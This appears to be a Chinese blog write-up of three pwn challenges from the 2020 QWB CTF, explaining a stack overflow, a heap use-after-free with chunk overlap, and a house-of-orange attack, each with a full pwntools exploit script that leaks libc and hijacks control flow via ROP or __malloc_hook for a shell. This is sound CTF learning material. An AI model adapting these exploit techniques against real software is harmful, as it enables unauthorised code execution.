---
title: 2020强网杯线上 pwn write up
date: 2020-11-08 01:15:58
tags: CTF
---

tcl，只在指点下做上来一个签到题，懒狗复现也拖了很久  <!--more-->

## babymessage  

在work函数中  

![](baby1.png)

v1被赋值为16，而v3距离rbp的偏移是0x8，有8字节的溢出，可以控制到rbp，查看leave_message函数的汇编代码，发现read的size，也就是rdx，受rbp加一个偏移的控制，那么我们只需要控制到rbp，就有机会控制size，可以造成栈溢出  

那么我们控制rbp的值为0xe0，调试查看rdx的值  

![](baby2.png)

可以看到rdx已经被我们改成0xe0了，那么read的字节数就是0xe0，那么接下来直接rop  

### exp  

```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './babymessage' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("123.56.170.202",21342)
elf=ELF(binary)
libc=ELF('libc-2.27.so')
def pwn():
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("age:")
    payload = "a"*8 + '\xe0'
    p.send(payload)
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("age:")
    payload = "a"*16 + p64(0x0000000000400ac3)+ p64(elf.got['puts']) +  p64(elf.plt['puts']) + p64(0x4006e0)
    p.send(payload)
    libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['puts']
    log.success("libc_base==>" + hex(libc_base))
    one = libc_base + 0x4f365
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("age:")
    payload = "a"*8 + '\xe0'
    p.send(payload)
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("age:")
    payload = "a"*16 + p64(one)
    p.send(payload)
    p.interactive()
pwn()
```

## babynotes  

glibc2.23，存在uaf，存在off by one，存在溢出，解法有好几种，先放一种，有时间再研究其他的  

regist  

```C++  
int regist()
{
  char s; // [rsp+0h] [rbp-50h]
  __int64 v2; // [rsp+18h] [rbp-38h]
  __int64 v3; // [rsp+28h] [rbp-28h]

  memset(&s, 0, 0x50uLL);
  qword_6020D0 = (char *)malloc(0x100uLL);
  dest = (char *)malloc(0x18uLL);
  puts("Input your name: ");
  if ( (unsigned int)read(0, &s, 0x18uLL) == -1 )
    exit(0);
  puts("Input your motto: ");
  if ( (unsigned int)read(0, &v3, 0x20uLL) == -1 )
    exit(0);
  puts("Input your age: ");
  __isoc99_scanf("%lld", &v2);
  strcpy(dest, &s);
  strncpy(qword_6020D0, (const char *)&v3, 0x20uLL);
  qword_6020C8 = v2;
  return puts("Done!");
}
```

regist函数中可以看到name和age使用的是同一个栈，那么可以让name和age相连，然后通过strcpy复制到dest中，造成溢出，修改下一个chunk的size  

先利用uaf直接leak libc，接着进入reset函数，再次进入regist函数修改name和age，通过溢出，修改index为2的chunk size为0xe1，即0x70的2倍，并将index为2的chunk free掉，形成chunk overlap  

通过申请把原chunk2大小的数据切割出来，unsorted bin里面剩下的chunk就是chunk3对应的块，此时chunk3没有释放，再次申请同样大小的chunk，就能将chunk3的指针放在index=1的位置上，从而使1=3  

接下来就是老生常谈的，通过uaf，改fd为malloc_hook，打malloc_hook为one_gadget  

### exp  

```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './babynotes' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=ELF("libc-2.23.so")
def add(index,size):
    p.sendlineafter('>>','1')
    p.sendlineafter('Input index:',str(index))
    p.sendlineafter('Input note size:',str(size))
def show(index):
    p.sendlineafter('>>','2')
    p.sendlineafter('Input index:',str(index))
def free(index):
    p.sendlineafter('>>','3')
    p.sendlineafter('Input index:',str(index))
def edit(index,content):
    p.recvuntil(">> ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("note:")
    p.send(content)
def reset(name,motto,size):
    p.recvuntil(">> ")
    p.sendline("5")
    p.sendafter('Input your name:',name)
    p.sendafter('Input your motto:',motto)
    p.sendlineafter('Input your age:',str(size))
def welcome(name,motto,size):
    p.sendafter('Input your name:',name)
    p.sendafter('Input your motto:',motto)
    p.sendlineafter('Input your age:',str(size))

welcome("N","N",1)
add(0,0x100)
add(1,0x18)
add(2,0x60)
add(3,0x60)
add(4,0x60)
free(0)
add(0,0x100)
show(0)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_addr - 0x3c4b78
log.success("libc_base==>" + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
onegg = libc_base + 0xf1207

free(0)
free(1)
reset("n"*0x18,"N",0xe1)
free(2)
add(0,0x60)
add(1,0x60)
free(1)
free(0)
free(1)
add(3,0x60)
edit(3,p64(malloc_hook - 0x23))
add(0,0x60)
add(1,0x60)
add(2,0x60)
edit(2,"a"*0x13 + p64(onegg))

free(0)
add(0,0x60)

p.interactive()
```

## Just_a_Galgame  

```C++
__int64 __fastcall main(__int64 a1, char **a2, char **a3, double a4)
{
  unsigned int v4; // eax
  int v5; // eax
  bool v6; // cf
  bool v7; // zf
  signed __int64 v8; // rcx
  const char *v9; // rsi
  _BYTE *v10; // rdi
  signed int v12; // [rsp+4h] [rbp-3Ch]
  signed int v13; // [rsp+8h] [rbp-38h]
  signed int v14; // [rsp+Ch] [rbp-34h]
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v16; // [rsp+18h] [rbp-28h]
  int v17; // [rsp+28h] [rbp-18h]
  int v18; // [rsp+2Ch] [rbp-14h]

  v18 = 1;
  buf = 0LL;
  v16 = 0LL;
  v12 = 7;
  v13 = 1;
  v14 = 1;
  v17 = 0;
  sub_401182(a4);
  while ( 2 )
  {
    v4 = v18++;
    sub_4011E7(v4);
    read(0, &buf, 0x10uLL);
    switch ( atoi((const char *)&buf) )
    {
      case 1:
        if ( v12 <= 0 )
        {
          puts("Emmm...Alright. Thank you.");
        }
        else
        {
          --v12;
          puts("\nHotaru: Wow! Thanks~\n");
          qword_404060[6 - v12] = (__int64)malloc(0x68uLL);
          puts("[ You've hold some place in her heart! ]");
        }
        continue;
      case 2:
        if ( v13 <= 0 || v12 > 6 )
        {
          puts("\nHotaru: Emmm...Sorry I should go home now. Maybe the next time.\n");
        }
        else
        {
          puts("\nHotaru: Okay~ Let's choose a movie!\n");
          --v13;
          printf("idx >> ", &buf);
          read(0, &buf, 0x10uLL);
          if ( qword_404060[atoi((const char *)&buf)] )
          {
            printf("movie name >> ", &buf);
            v5 = atoi((const char *)&buf);
            read(0, (void *)(qword_404060[v5] + 96), 0x10uLL);
            puts("\nHotaru: What a good movie! I like it~\n");
            puts("[ You've gained a lot favor of her! ]");
          }
          else
          {
            puts("[ The movie is not exist. ]");
            ++v13;
          }
        }
        continue;
      case 3:
        if ( v14 <= 0 || v12 > 6 )
        {
          puts("\nHotaru: Sorry, I think it's better for us to be friends.\n");
        }
        else
        {
          --v14;
          puts("You are the apple of my eyes too!");
          qword_404098 = (__int64)malloc(0x1000uLL);
          ++v13;
        }
        continue;
      case 4:
        puts("Reciew your cgs >> ");
        while ( v17 <= 6 - v12 )
        {
          printf("%d: %s\n", (unsigned int)v17, qword_404060[v17]);
          ++v17;
        }
        continue;
      case 5:
        puts("\nHotaru: Won't you stay with me for a while? QAQ\n");
        read(0, &unk_4040A0, 8uLL);
        v8 = 8LL;
        v9 = "No bye!";
        v10 = &unk_4040A0;
        do
        {
          if ( !v8 )
            break;
          v6 = (const unsigned __int8)*v9 < *v10;
          v7 = *v9++ == *v10++;
          --v8;
        }
        while ( v7 );
        if ( (!v6 && !v7) != v6 )
        {
          puts("\n(='3'=)>daisuki~\n");
          continue;
        }
        return 0LL;
      default:
        puts("[ Wrong choice. ]");
        continue;
    }
  }
}
```

1是创建一个0x68大小的chunk，2是通过index索引指针并向指针+0x60的地方写0x10的数据，3是malloc一个0x1000的大块，4是show，5是向0x4040A0的地方写8字节数据，而堆指针存放在0x404060处，所以可以获得一个越界写，直接写chunk里的内容  

但是程序没有free功能，这里就需要利用house of orange来实现类似于free的功能，搞出libc地址  

#### house of orange

现学了一下house of orange，简单来说是当前堆的top chunk大小不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，那么就可以在没有free的情况下获取到unsorted bins，也就能搞到libc地址  

但是需要满足以下几个条件

1. 伪造的size必须要对齐到内存页
2. size要大于MINSIZE(0x10)
3. size要小于之后申请的chunk size + MINSIZE(0x10)
4. size的prev inuse位必须为 1

在这里，我们通过越界写，改top chunk的size，但是需要对齐到内存页，看看一开始的时候top chunk是多大

![](g1.png)

那我们改成0xd41就彳亍了  

接着通过地址之间的差计算出index，直接打malloc_hook为one_gadget就彳亍

### exp

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './Just_a_Galgame' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("",)
elf=ELF(binary)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add():
    p.recvuntil(">> ")
    p.sendline("1")
def edit(index,content):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("idx >> ")
    p.sendline(str(index))
    p.recvuntil("movie name >> ")
    p.send(content)
def movie():
    p.recvuntil(">> ")
    p.sendline("3")
def show():
    p.recvuntil(">> ")
    p.sendline("4")
def leave(content):
    p.recvuntil(">> ")
    p.sendline("5")
    p.recvuntil("QAQ\n")
    p.send(content)

def exp():
    add()
    edit(0,p64(0) + p64(0xd41))
    movie()
    add()
    show()
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = puts_addr - 0x3ec2a0
    log.success("libc_base==>" + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    onegg = libc_base + 0x4f3c2 #0x4f365 # 0x10a45c
    #gdb.attach(p)
    leave(p64(malloc_hook - 0x60))
    edit(int((0x4040A0-0x404060)/8),p64(onegg))
    add()
    p.interactive()
exp()
```

Siri不会做，看不明白，不知道咋整，其他的后续尽量复现吧  

